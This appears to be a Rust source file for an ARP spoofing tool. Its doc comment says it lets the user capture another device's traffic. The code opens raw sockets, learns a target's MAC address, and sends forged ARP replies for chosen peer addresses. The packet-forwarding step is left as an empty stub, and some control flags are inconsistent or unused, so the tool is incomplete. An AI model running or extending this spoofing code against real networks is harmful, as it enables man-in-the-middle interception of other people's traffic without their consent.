use std::{
    io::ErrorKind,
    net::Ipv4Addr,
    time::{Duration, Instant},
};

use pnet::{
    datalink::{DataLinkReceiver, DataLinkSender, NetworkInterface},
    packet::{
        arp::{ArpOperations, ArpPacket}, ethernet::{EtherTypes, EthernetPacket}, ipv4::Ipv4Packet, FromPacket, Packet
    },
    util::MacAddr,
};
use rustc_hash::{FxHashMap, FxHashSet};

use super::utils::{
    create_arp_reply_v4_eth, create_arp_request_v4_eth, get_rawsock, ArpTable, ARP_PACKET_LEN,
    ETH_HEADER_LEN,
};

/// This implements an async state machine that allows the user to perform an arp spoofing
/// attack. This allows the user to capture the traffic of another device.
pub struct ArpSpoofer {
    interface: NetworkInterface,
    socket_send: Box<dyn DataLinkSender>,
    socket_recv: Box<dyn DataLinkReceiver>,
    last_spoof: Instant,
    target: Option<Ipv4Addr>,
    spoof_ips: FxHashSet<Ipv4Addr>,
    arp_table: ArpTable,
}
impl ArpSpoofer {
    pub fn new(interface_name: &str, target: Option<Ipv4Addr>) -> std::io::Result<Self> {
        let (interface, socket_send, socket_recv) =
            get_rawsock(interface_name, Some(Duration::from_millis(1)))?;
        if interface.mac.is_none() {
            return Err(std::io::Error::new(
                ErrorKind::NotFound,
                "Interface missing mac address",
            ));
        }
        return Ok(Self {
            interface,
            socket_send,
            socket_recv,
            last_spoof: Instant::now(),
            target,
            spoof_ips: FxHashSet::default(),
            arp_table: ArpTable::new(),
        });
    }
    pub fn send_spoofs(&mut self) -> std::io::Result<()> {
        let target_mac = self
            .target
            .and_then(|target| self.arp_table.get_entry(target));
        let target_tuple = match (self.target, target_mac) {
            (Some(target_ip), Some(target_mac)) => Some((target_ip, target_mac)),
            (Some(_target_ip), None) => {
                return Err(std::io::Error::new(
                    ErrorKind::NotFound,
                    "Target mac not found",
                ))
            }
            (None, None) => None,
            (None, Some(_)) => unreachable!(),
        };

        for ip in self.spoof_ips.iter().cloned() {
            let packet = create_arp_reply_v4_eth(target_tuple, ip, self.interface.mac.unwrap());
            self.socket_send.send_to(&packet, None);
        }

        return Ok(());
    }
    pub fn add_peer(&mut self, target: Ipv4Addr) {
        self.spoof_ips.insert(target);
    }
    pub fn remove_peer(&mut self, target: Ipv4Addr) {
        self.spoof_ips.remove(&target);
    }
    pub fn tick(&mut self) -> std::io::Result<()> {
        /*
            If we're missing info for our target, query it.
            If we're missing info for our router, query it.
            Try receiving a packet for 5ms.
            If we timed out, send a spoofed arp reply.
            If we got the packet,
                check if it was for our target.
                    If it was, forward it
                check if it was for the router.
                    If it was, forward it.
        */

        // Check for target information.
        let can_spoof = if let Some(target) = self.target {
            if self.arp_table.get_entry(target).is_none()
                && self
                    .arp_table
                    .should_request(target, Duration::from_millis(50))
            {
                // Send ARP request.
                let request = create_arp_request_v4_eth(
                    target,
                    // Seems like devices respond to an invalid IP here.
                    // All they really need is the mac address, and we
                    // may not have an IP.
                    Ipv4Addr::from_bits(0),
                    self.interface.mac.unwrap(),
                );
                self.socket_send.send_to(&request, None).unwrap()?;
                false
            } else {
                false
            }
        } else {
            true
        };

        let packet = self.socket_recv.next()?;
        let packet = match EthernetPacket::new(packet) {
            Some(packet) => packet,
            None => return Ok(()),
        };

        match packet.get_ethertype() {
            EtherTypes::Arp => match ArpPacket::new(packet.payload()) {
                Some(arp_packet) => {
                    if arp_packet.get_protocol_type() != EtherTypes::Ipv4
                        || arp_packet.get_operation() != ArpOperations::Reply
                    {
                        return Ok(());
                    }
                    self.arp_table.add_entry(
                        arp_packet.get_sender_proto_addr(),
                        arp_packet.get_sender_hw_addr(),
                    );
                }
                // Nothing we can do. It's not a valid packet.
                None => return Ok(()),
            },
            EtherTypes::Ipv4 => match Ipv4Packet::new(packet.payload()) {
                Some(ip4_packet) => {
                    // Identify packet. If it's for or from our target, pass it on.
                }
                None => return Ok(()),
            }
            _ => {}
        }

        return Ok(());
    }
}
